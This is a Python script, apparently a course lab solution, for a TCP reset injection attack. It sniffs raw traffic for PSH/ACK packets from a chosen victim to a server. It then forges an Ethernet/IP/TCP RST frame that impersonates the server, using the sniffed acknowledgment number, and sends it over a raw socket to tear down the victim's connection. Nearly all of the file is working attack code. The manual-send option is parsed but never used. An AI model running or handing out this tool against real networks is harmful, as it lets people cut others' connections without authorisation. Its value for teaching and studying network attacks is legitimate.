#!/usr/bin/env python3

##
# Lab 3: Break someone's connection to a TCP host by sending them a RST packet
##

import cno_net_helper as cno
import socket
import struct
import sys
import argparse

parser = argparse.ArgumentParser(
    description="A simple script for either autogenerating a rst packet or manually specifying it"
)
parser.add_argument(
    "victim_ip", type=str, help="The ip address of the client you want to rst"
)
parser.add_argument(
    "server_ip",
    type=str,
    help="The ip of the server the victim is trying to connect to",
)
parser.add_argument(
    "port", type=int, default=1234, help="The port the victim is trying to connect to"
)
parser.add_argument(
    "-i",
    "--interface",
    type=str,
    help="The interface to sniff traffic on",
    default="eno1",
)

# These are optional and only need to specified if you are doing a manual send
parser.add_argument(
    "-m",
    "--manual",
    action="store_true",
    help="Specify that you want to run the rst packet manually",
)
parser.add_argument(
    "--victim-port",
    type=int,
    default=4321,
    help="The port the victim is connecting from. Only specify this is doing a manual reset",
)
parser.add_argument(
    "--victim-mac",
    type=str,
    default="0:0:0:0:0:0",
    help="The mac address of the victim. Only specify this is doing a manual reset",
)
parser.add_argument(
    "--host-mac",
    type=str,
    default="0:0:0:0:0:0",
    help="The mac address of the host the victim is trying to connect to. Only specify this is doing a manual reset",
)
parser.add_argument(
    "--seq-num",
    type=int,
    default=12345678,
    help="The sequence number to send in the rst. Only specify this is doing a manual reset",
)
parser.add_argument(
    "--ack-num",
    type=int,
    default=87654321,
    help="The ack number to send in the rst packet. Only specify this is doing a manual reset",
)

args = parser.parse_args()

dev = args.interface  # used to be eth0
ETH_P_ALL = 0x03  # raw socket stuff (check man pages, RFCs)
send_automatically = not args.manual

##
# set these always
##
victim_ip = args.victim_ip  # host whose server we're RSTing
server_ip = args.server_ip  # host that the victim is connecting to
server_port = args.port  # port number the victim is connecting to

##
# set these if manually sending the packet (not sniffing)
##
victim_mac = args.victim_mac  # physical address of the victim
server_mac = args.host_mac  # host the victim is connected to
victim_port = args.victim_port  # port the victim is connecting from
seq_num = args.seq_num  # look for this in wireshark
ack_num = args.ack_num  # look for this in wireshark

##
# first let's set up the binary data
##
victim_mac = cno.mac_str_to_bin(victim_mac)
server_mac = cno.mac_str_to_bin(server_mac)
victim_ip = cno.ipv4_str_to_bin(victim_ip)
server_ip = cno.ipv4_str_to_bin(server_ip)
server_port = struct.pack(">H", server_port)
victim_port = struct.pack(">H", victim_port)
seq_num = struct.pack(">I", seq_num)
ack_num = struct.pack(">I", ack_num)

ETH_IP_TYPE = b"\x08\x00"
IP_TCP_TYPE = b"\x06"
PSH_ACK_FLAGS = b"\x18"


def make_eth_hdr(dst_mac, src_mac, typ):
    dst = dst_mac if isinstance(dst_mac, bytes) else cno.mac_str_to_bin(dst_mac)
    src = src_mac if isinstance(src_mac, bytes) else cno.mac_str_to_bin(src_mac)
    typ = typ if isinstance(typ, bytes) else struct.pack(">H", typ)
    return dst + src + typ


def make_ip_hdr(src_ip, dst_ip):
    ipv4hdr = b"\x45"  # version 4, header length 5 (*4 bytes)
    ipv4hdr += b"\x00"  # type of service
    ipv4hdr += b"\x00\x28"  # total length including internet header and data
    ipv4hdr += b"\xff\xff"  # identification
    ipv4hdr += b"\x00\x00"  # 3 bits flags, 13 bits fragment offset
    ipv4hdr += b"\xff"
    ipv4hdr += b"\x06"  # protocol TCP
    ipv4hdr += b"\x00\x00"  # hdr checksum
    ipv4hdr += src_ip if isinstance(src_ip, bytes) else cno.ipv4_str_to_bin(src_ip)
    ipv4hdr += dst_ip if isinstance(dst_ip, bytes) else cno.ipv4_str_to_bin(dst_ip)
    return ipv4hdr


def make_tcp_hdr(src_port, dst_port, seq_num, ack_num=0):
    hdr = src_port if isinstance(src_port, bytes) else struct.pack(">H", src_port)
    hdr += dst_port if isinstance(dst_port, bytes) else struct.pack(">H", dst_port)
    hdr += seq_num if isinstance(seq_num, bytes) else struct.pack(">L", seq_num)
    hdr += ack_num if isinstance(ack_num, bytes) else struct.pack(">L", ack_num)
    hdr += b"\x50\x04"  # header length 20 bytes, then flags (RST)
    hdr += b"\x00\x00"  # Window size
    hdr += b"\x00\x00"  # checksum
    hdr += b"\x00\x00"  # urgent pointer
    return hdr


def handle_packet(linkdata):
    # parse the ethernet header
    ethhdr = linkdata[:14]

    # if the packet wasn't IPv4, ignore it
    if ethhdr[12:14] != ETH_IP_TYPE:
        return

    # parse the IP header
    netdata = linkdata[14:]
    ip4hdr = netdata[:20]

    # if this isn't a packet from our target to our host, ignore it
    srcip = ip4hdr[12:16]
    dstip = ip4hdr[16:20]
    if not (victim_ip == srcip and server_ip == dstip):
        return

    print(f"Found packet with victim ip {srcip} as source and server ip {dstip} as dst")

    # if the packet isn't TCP, ignore it
    if ip4hdr[9:10] != IP_TCP_TYPE:
        return

    # parse the TCP header
    transdata = netdata[20:]
    tcphdr = transdata[:20]

    # see if the packet is going to the correct port
    dst_port = tcphdr[2:4]
    if dst_port != server_port:
        return

    print("Found packet with server port as dst port")

    victim_port = tcphdr[0:2]  # save this for later

    # we want to respond to a packet that had the ACK flag set
    someflags = tcphdr[
        13:14
    ]  # just the second two bytes of flags (of 3)

    # ACK, PSH (show up in netcat packets- watch wireshark)
    if someflags != PSH_ACK_FLAGS:
        return

    appdata = transdata[20:]
    # okay, it looks like this is the communication we're looking for!

    seq_bytes = tcphdr[4:8]  # send ACK for the given SEQ
    (seq,) = struct.unpack(">I", seq_bytes)
    print("seq = {}".format(seq))

    ack_bytes = tcphdr[8:12]
    (ack,) = struct.unpack(">I", ack_bytes)
    print("ack = {}".format(ack))

    seq_num_to_send = ack
    print("Will send seq-> {}".format(seq_num_to_send))

    # set up the mac address values for our RST packet
    server_mac = ethhdr[0:6]
    victim_mac = ethhdr[6:12]
    print("Found ACK packet, sending reset")
    ether_hdr = make_eth_hdr(
        victim_mac, server_mac, cno.ETH_TYPES["IP"]
    )
    ipv4_hdr = make_ip_hdr(server_ip, victim_ip)
    tcp_hdr = make_tcp_hdr(
        src_port=server_port,
        dst_port=victim_port,
        seq_num=seq_num_to_send,
    )

    payload = ether_hdr + ipv4_hdr + tcp_hdr
    cno.rawsend_cksum_ipv4(payload, dev)


##
# auto mode: let's listen for an ACK from our target and send back a RST as the host
##
if send_automatically:

    print(
        "Sniffing wire for ACK from {}:{} to {}:{}".format(
            socket.inet_ntoa(victim_ip),
            struct.unpack(">H", victim_port)[0],
            socket.inet_ntoa(server_ip),
            struct.unpack(">H", server_port)[0],
        )
    )

    cno.rawrecv_with_callback(dev, handle_packet)
